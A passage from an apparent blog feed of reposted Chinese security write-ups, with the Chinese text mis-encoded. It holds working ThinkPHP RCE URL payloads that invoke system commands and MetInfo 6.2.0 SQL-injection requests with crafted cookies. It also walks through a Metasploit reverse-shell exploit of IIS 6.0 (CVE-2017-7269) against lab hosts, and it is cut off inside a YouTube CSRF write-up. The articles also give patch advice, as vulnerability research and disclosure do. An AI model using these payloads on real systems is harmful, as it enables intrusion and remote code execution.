class="line">7ã€?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">8ã€?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´è¡¥ä¸"><a href="#æ¼æ´è¡¥ä¸" class="headerlink" title="æ¼æ´è¡¥ä¸"></a>æ¼æ´è¡¥ä¸</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg" alt></p><p>è¯¥è¡¥ä¸ä¸º<strong>5.0.x</strong>è¡¥ä¸ï¼Œ<strong>5.1.x</strong>ä½ç½®ä¸ä¸€æ ·ï¼Œæ–¹å¼ä¸€æ ·ã€‚</p><p>è¡¥ä¸æ–¹å¼ä¸ºé™åˆ¶<strong>controller</strong>åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ã€‚å¹¶ä¸”æ”¾åœ¨<strong>controller</strong>å¤„ç†ä¹‹å‰ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç®€å•æ¥è¯´è¿™ä¸ªæ´æ˜¯ç”±äºç”¨æˆ·æ§åˆ¶äº†<strong>controllerå¯¼è‡´çš„ï¼Œå¼€å‘è€…å°†å¤„ç†controllerçš„ä»£ç å°è£…åˆ°äº†Loader.phpï¼Œå¹¶ä¸”ä¸å…¶ä»–åŠŸèƒ½è¿›è¡Œä»£ç å¤ç”¨ï¼Œä¸ºäº†æ»¡è¶³å…¶ä»–åŠŸèƒ½å¢åŠ çš„åŠŸèƒ½(å³ç‰¹æ®Šå¤„ç†å­˜åœ¨\çš„å‚æ•°)ï¼Œä»è€Œå¯¼è‡´äº†æ¼æ´ã€‚ä»£ç å¤ç”¨æ˜¯å¼€å‘è€…ä¼˜è´¨çš„ä¹ æƒ¯ï¼Œä½†ä¹Ÿéœ€è¦ä¸¥æ ¼å®¡æ ¸æ˜¯å¦å› ä¸ºä¹¦å†™å¤ç”¨ä»£ç æ—¶æ˜¯å¦ä¼šé€ æˆæ¼æ´ã€‚</strong></p><p>å¦å¤–ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªéå¸¸æµ…æ˜¾çš„æ´ï¼Œè‡³ä»Šæ²¡æœ‰äººå‘ç°ï¼Œæœ€ç»ˆç”±å®˜æ–¹çˆ†å‡ºï¼Œä¹Ÿè®¸å¾ˆå¤šç”¨æˆ·é»˜è®¤æ­¤å¼€æºæ¡†æ¶â€œæµè¡Œ == å®‰å…¨â€ï¼Œå…¶å®å¾ˆå¤šåº”ç”¨å¹¶ä¸æ˜¯æƒ³è±¡ä¸­çš„å®Œå…¨å®‰å…¨ï¼Œæ¼æ´ç»å¸¸å‘ç”Ÿåœ¨è¢«äººå¿½è§†çš„åœ°æ–¹ã€‚</p><p>è½¬è½½äºï¼š<a href="https://p0sec.net/index.php/archives/125/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/125/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>metinfo 6.2.0æœ€æ–°ç‰ˆæœ¬å‰å°æ³¨å…¥æ¼æ´</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/metinfo%206.2.0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>metinfo 6.2.0æœ€æ–°ç‰ˆæœ¬å‰å°æ³¨å…¥æ¼æ´<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p><h2 id="æ¼æ´ç¯å¢ƒï¼š"><a href="#æ¼æ´ç¯å¢ƒï¼š" class="headerlink" title="æ¼æ´ç¯å¢ƒï¼š"></a>æ¼æ´ç¯å¢ƒï¼š</h2><p>docker pull zksmile/vul:metinfov6.2.0</p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°:"></a>æ¦‚è¿°:</h2><p>çœ‹åˆ°æŸä¸ªè¡¨å“¥å‘çš„metinfo 6.1.3æœ€æ–°æ³¨å…¥ï¼ˆ<a href="https://xz.aliyun.com/t/4508)ï¼Œä»¥å‰æˆ‘å‘è¿‡metinfoåˆ©ç”¨æ³¨å…¥getshellçš„æ–‡ç« ï¼Œè¿™é‡Œæ­£å¥½å¯ä»¥ç»“åˆã€‚ï¼ˆhttps://nosec.org/home/detail/2324.html)ï¼Œåœ¨æ£€æŸ¥å®˜æ–¹å‘å¸ƒçš„æœ€æ–°ç‰ˆ6.2.0ç‰ˆæœ¬çš„æ—¶å€™ï¼Œå‘ç°è¯¥æ¼æ´å¹¶æœªä¿®å¤ã€‚" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)ï¼Œä»¥å‰æˆ‘å‘è¿‡metinfoåˆ©ç”¨æ³¨å…¥getshellçš„æ–‡ç« ï¼Œè¿™é‡Œæ­£å¥½å¯ä»¥ç»“åˆã€‚ï¼ˆhttps://nosec.org/home/detail/2324.html)ï¼Œåœ¨æ£€æŸ¥å®˜æ–¹å‘å¸ƒçš„æœ€æ–°ç‰ˆ6.2.0ç‰ˆæœ¬çš„æ—¶å€™ï¼Œå‘ç°è¯¥æ¼æ´å¹¶æœªä¿®å¤ã€‚</a></p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>å‰å°ï¼Œï¼ˆ<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ï¼‰ä½œè€…åœ¨è¿™é‡Œè¯´éœ€è¦æ³¨å†Œä¼šå‘˜ï¼Œå…¶å®æœ‰ä¸€å¤„ä¸éœ€è¦ã€‚æ¼æ´è¯¦æƒ…<br>è¿™é‡Œå…³é”®ç‚¹åœ¨authç±»çš„encode()å’Œdecode()æ–¹æ³•ã€‚çœ‹ä¸‹ä»£ç ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¸¤ä¸ªæ–¹æ³•å…¨éƒ½è°ƒç”¨äº†authcode()æ–¹æ³•ï¼Œè·Ÿè¿›authcodeçœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œdecodeå’Œencodeç®—æ³•å¯é€†ï¼Œä½†æˆ‘ä»¬éœ€è¦çŸ¥é“$keyçš„å€¼ï¼ŒæŸ¥çœ‹æ„é€ å‡½æ•°ï¼š<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[â€˜configâ€™][â€˜met_webkeysâ€™];<br>    }<br>è¿™é‡Œ$keyçš„å€¼æ˜¯æ¥æºäºmet_webkeysè¿™ä¸ªé…ç½®ï¼ŒæŸ¥çœ‹met_webkeysæ¥æºå‘ç°åœ¨å®‰è£…çš„æ—¶å€™æŠŠè¿™ä¸ªkeyå†™å…¥åˆ°./config/config_safe.phpæ–‡ä»¶ä¸­ã€‚<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p><p>æŸ¥çœ‹/config/config_safe.phpæ–‡ä»¶ï¼Œè¿™é‡Œå†™å…¥æ–¹å¼ç±»ä¼¼ä»¥ä¸‹ï¼Œä½†pç‰›åœ¨æŸç¯‡æ–‡ç« ä¸­è¯´è¿‡ï¼Œè¿™ç§æ˜¯æ— æ³•è§£æçš„ï¼Œphpåé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œå³é”®æŸ¥çœ‹æºä»£ç å³å¯å¾—åˆ°met_webkeysï¼Œä½†æœ‰çš„ä¼šæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸ªè¡¨å“¥æ‰€è¯´å’Œphpçº¿ç¨‹å®‰å…¨æœ‰å…³ï¼Œæœ¬åœ°è¯•äº†ä¸‹å¥½åƒæ˜¯è¿™æ ·ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p><p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼Œç®€å•è¯´ä¸‹å…¶ä¸­ä¸€ä¸ªã€‚åœ¨registerç±»çš„doemailvild()æ–¹æ³•ä¸­ï¼Œè¿™é‡ŒæŠŠç”¨æˆ·æäº¤çš„på‚æ•°è¿›è¡Œäº†è§£å¯†ï¼Œå¹¶ä¸”ä¼ å…¥åˆ°äº†get_user_valid()æ–¹æ³•ä¸­ã€‚<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p><p>æŸ¥çœ‹get_user_valid()æ–¹æ³•ï¼Œè¿™é‡ŒåˆæŠŠè§£å¯†åçš„å€¼ä¼ å…¥åˆ°äº†get_user_by_username()æ–¹æ³•ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p><p>æŸ¥çœ‹get_user_by_username()æ–¹æ³•ï¼Œåˆä¼ å…¥äº†get_user_by_nameid()æ–¹æ³•ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p><p>æŸ¥çœ‹get_user_by_nameid()æ–¹æ³•ï¼Œç›´æ¥æ‹¼æ¥ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p><p>è¿™é‡ŒåŸºæœ¬å°±æ¸…æ¥šäº†ï¼Œå°†authç±»çš„authcode()æ–¹æ³•copyæœ¬åœ°ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p><p>è®¿é—®æœ¬åœ°æ–‡ä»¶å¾—åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p><p>å°†åŠ å¯†åçš„å­—ç¬¦ä¸²æ”¾åˆ°cookieï¼Œgetæˆ–è€…postä¸­ï¼Œæ„é€ è¯·æ±‚æäº¤ï¼Œå»¶æ—¶æ³¨å…¥æˆåŠŸã€‚</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>å¤ç°æ—¶éœ€è¦æ³¨æ„çš„ç‚¹ï¼š<br>1ã€php.iniä¸­ short_open_tag=off</p><p>2ã€ä¸ç®¡éœ€ä¸éœ€è¦ç™»å½•ï¼Œæœ€èµ·ç éœ€è¦ç½‘ç«™æœ‰ä¸€ä¸ªä¼šå‘˜å­˜åœ¨ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ä¸éœ€è¦ç™»é™†å°±å¯æ³¨å…¥ï¼Œå¦ä¸€ä¸ªæ˜¯coolcatè¡¨å“¥æ‰€è¯´çš„éœ€è¦ä»¥ä¼šå‘˜ç™»é™†ã€‚ä»¥ä¸‹è¯·è‡ªè¡Œæ›¿æ¢på‚æ•°ã€‚</p><h4 id="1ã€ä¸éœ€è¦ç™»é™†"><a href="#1ã€ä¸éœ€è¦ç™»é™†" class="headerlink" title="1ã€ä¸éœ€è¦ç™»é™†"></a>1ã€ä¸éœ€è¦ç™»é™†</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p><h4 id="2ã€-éœ€è¦ç™»é™†"><a href="#2ã€-éœ€è¦ç™»é™†" class="headerlink" title="2ã€ éœ€è¦ç™»é™†"></a>2ã€ éœ€è¦ç™»é™†</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p><p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;è‡ªè¡Œæ·»åŠ ç™»é™†åçš„cookie&gt;</p><h3 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h3><p>ç›®å‰å®˜ç½‘æ²¡æœ‰æ›´æ–°ç›¸å…³è¡¥ä¸ã€‚<br>ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢å»ºè®®é™åˆ¶config_safe.phpçš„è®¿é—®æƒé™æ¥è¿›è¡Œåº”æ€¥ä¿®å¤ã€‚<br>Apacheé…ç½®.htaccessæ–‡ä»¶ï¼š</p><p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p><p>Nginxåœ¨nginx.confæ–‡ä»¶æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š</p><p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p><p>æ–‡ç« è½¬è½½äºï¼š<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-7269 IIS6.0è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CVE-2017-7269%20IIS6.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>æ¼æ´ç¼–å·ï¼šCVE-2017-7269<br>å‘ç°äººå‘˜ï¼šZhiniang Pengå’ŒChen Wuï¼ˆåå—ç†å·¥å¤§å­¦ä¿¡æ¯å®‰å…¨å®éªŒå®¤,è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢ï¼‰<br>æ¼æ´ç®€è¿°ï¼šå¼€å¯WebDAVæœåŠ¡çš„IIS 6.0è¢«çˆ†å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç›®å‰é’ˆå¯¹ Windows Server 2003 R2 å¯ä»¥ç¨³å®šåˆ©ç”¨ï¼Œè¯¥æ¼æ´æœ€æ—©åœ¨2016å¹´7,8æœˆä»½å¼€å§‹åœ¨é‡å¤–è¢«åˆ©ç”¨ã€‚<br>æ¼æ´ç±»å‹ï¼šç¼“å†²åŒºæº¢å‡º<br>æ¼æ´ç­‰çº§ï¼šé«˜å±<br>å½±å“äº§å“ï¼šMicrosoft Windows Server 2003 R2 å¼€å¯WebDAVæœåŠ¡çš„IIS6.0ï¼ˆç›®å‰å·²éªŒè¯ï¼Œå…¶ä»–ç‰ˆæœ¬å°šæœªéªŒè¯ï¼‰<br>è§¦å‘å‡½æ•°ï¼šScStoragePathFromUrlå‡½æ•°<br>é™„åŠ ä¿¡æ¯ï¼šScStoragePathFromUrlå‡½æ•°è¢«è°ƒç”¨äº†ä¸¤æ¬¡</p><h2 id="å¤ç°æ¼æ´"><a href="#å¤ç°æ¼æ´" class="headerlink" title="å¤ç°æ¼æ´"></a>å¤ç°æ¼æ´</h2><p>å¤ç°ç¯å¢ƒï¼šMicrosoft Windows Server 2003 R2</p><p><img src="http://zone.secevery.com/uploads/article/20190421/a3f037a81fca524ab7e73b07a570a367.png" alt></p><p>å¼€å¯äº†WebDAVæœåŠ¡</p><p><img src="http://zone.secevery.com/uploads/article/20190421/6728f3cc3e99686ee36fd23c44ac9f6c.png" alt></p><p>æ”»å‡»è€…IPï¼š192.168.1.144<br>ç›®æ ‡æœºIPï¼š192.168.1.175</p><p>exp:<a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a></p><p><img src="http://zone.secevery.com/uploads/article/20190421/32ee5fb6e63b209e64303c27d054c216.png" alt></p><p>æŠŠexp å¤åˆ¶åˆ°æ”»å‡»æœºå™¨çš„/usr/share/metasploit-framework/modules/exploits/windows/iisç›®å½•ä¸‹</p><p><img src="http://zone.secevery.com/uploads/article/20190421/b5f1712c0adc2eda0a6ed9357f504787.png" alt></p><p>æ‰“å¼€ç¥å™¨Metasploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/469cf4e103aaa38514880545f9f7f7cc.png" alt></p><p>è¾“å…¥useå‘½ä»¤ï¼Œuse exploit/windows/iis/cve-2017-7269</p><p><img src="http://zone.secevery.com/uploads/article/20190421/9f52f610279f06c9041ddd0c8dd6b064.png" alt></p><p>ä½¿ç”¨å‘½ä»¤show options</p><p><img src="http://zone.secevery.com/uploads/article/20190421/2d3b6a438a938dd8c02231da8ce4a0d3.png" alt></p><p>1.è®¾ç½®ç›®æ ‡æœºip,set RHOST 192.168.1.175<br>2.è®¾ç½®å¯¹é¢ç½‘ç«™ï¼Œset HttpHost 192.168.1.175<br>3.è®¾ç½®è¿”å›è½½è·ï¼Œset payload windows/meterpreter/reverse_tcp<br>4.è®¾ç½®æ”»å‡»æœºipï¼Œset LHOST 192.168.1.144<br>5.è¿›è¡Œæº¢å‡ºï¼Œexploit</p><p><img src="http://zone.secevery.com/uploads/article/20190421/914441442ce49de5dad761370de3fe0f.png" alt></p><p>è¾“å…¥shellå‘½ä»¤ï¼Œæ¥åˆ°äº†æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„ç•Œé¢</p><p><img src="http://zone.secevery.com/uploads/article/20190421/e530373752927a0db121aaffd1bab50a.png" alt></p><p>æ‰§è¡Œå‘½ä»¤whoami</p><p><img src="http://zone.secevery.com/uploads/article/20190421/7c0533aea664a63ce89bfd8e600a8b24.png" alt></p><h2 id="ä¿®å¤æ„è§"><a href="#ä¿®å¤æ„è§" class="headerlink" title="ä¿®å¤æ„è§"></a>ä¿®å¤æ„è§</h2><p>2015å¹´7æœˆ15æ—¥ï¼Œå¾®è½¯å·²åœæ­¢å¯¹Windows Server 2003çš„æ”¯æŒï¼Œæ‰€ä»¥å®˜æ–¹æ²¡æœ‰ç›¸å…³è§£å†³æ–¹æ¡ˆï¼Œå»ºè®®ç”¨æˆ·å‡çº§åˆ°æœ€æ–°ç³»ç»Ÿ Windows Server 2016ã€‚å¦‚æœä¸è¿›è¡Œå‡çº§çš„è¯ï¼Œè¯·ç›´æ¥å…³é—­WebDAVæœåŠ¡é˜²æ­¢æ¼æ´è¢«åˆ©ç”¨ã€‚</p><p>è½¬è½½äºï¼š<a href="http://zone.secevery.com/article/1070" target="_blank" rel="noopener">http://zone.secevery.com/article/1070</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬]CSRFæ¼æ´åŠ«æŒYoutubeç”¨æˆ·çš„é€šçŸ¥æ¶ˆæ¯</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/CSRF%E6%BC%8F%E6%B4%9E%E5%8A%AB%E6%8C%81Youtube%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E7%9F%A5%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p><p>å¤§å®¶å¥½ï¼Œä»Šå¤©åˆ†äº«çš„writeupæ˜¯å…³äºYouTubeé€šçŸ¥æœåŠ¡ï¼ˆNotificationï¼‰çš„CSRFæ¼æ´ï¼Œä½œè€…åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åŠ«æŒå…¶ä»–YouTubeç”¨æˆ·ï¼ˆå—å®³è€…ï¼‰çš„é€šçŸ¥æœåŠ¡ï¼Œèƒ½ä»¥å—å®³è€…ç”¨æˆ·èº«ä»½æ¥æ”¶åˆ°å…¶è®¢é˜…é¢‘é“æˆ–è§†é¢‘çš„æœ€æ–°é€šçŸ¥ï¼Œæ¼æ´æœ€ç»ˆè·å¾—Googleå®˜æ–¹$3133.7ç¾é‡‘çš„å¥–åŠ±ï¼Œä»¥ä¸‹æ˜¯ä½œè€…çš„åˆ†äº«</p><p><strong> ä»POSTè¯·æ±‚ä¸­å‘ç°ç«¯å€ª</strong><br>æŸå¤©æ™šä¸Šï¼Œæˆ‘åœ¨YouTubeå®˜ç½‘ä¸Šæµ‹è¯•æ¼æ´ï¼Œçœ‹çœ‹èƒ½æœ‰ä»€ä¹ˆå‘ç°ï¼Œä¸çŸ¥ä¸è§‰æ—¶é—´å·²ç»æ˜¯åŠå¤œ00:30äº†ï¼Œå›°ç´¯ä¹‹æâ€¦..ã€‚æˆ‘å°±éšä¾¿ç‚¹ç‚¹æ‰“å¼€äº†YouTubeçš„é€šçŸ¥æœåŠ¡ï¼ˆNotificationï¼‰ï¼Œå…¶ä¸­çš„POSTè¯·æ±‚å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span 